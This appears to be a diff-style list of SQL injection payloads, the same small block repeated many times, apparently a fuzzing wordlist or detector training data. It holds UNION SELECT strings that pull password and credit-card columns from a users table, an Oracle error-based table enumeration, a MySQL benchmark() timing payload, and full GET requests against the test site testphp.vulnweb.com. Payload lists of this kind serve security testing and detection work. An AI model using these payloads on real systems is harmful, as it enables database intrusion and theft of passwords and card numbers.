+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, 2, 3 HTTP/1.1 Host: testphp.vulnweb.com' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,pass,cc FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+GET http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT * FROM users WHERE uname='test' HTTP/1.1 Host: testphp.vulnweb.com
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+UNION SELECT 1,pass,cc FROM users WHERE uname=
+' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i
+select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'
+select * from users where id = 1 or 1#(  union select 1,version (  )  -- 1
+GET http://testphp.vulnweb.com/artists.php?artist=1 or benchmark ( 10000000,MD5 ( 1  )  )  #",1
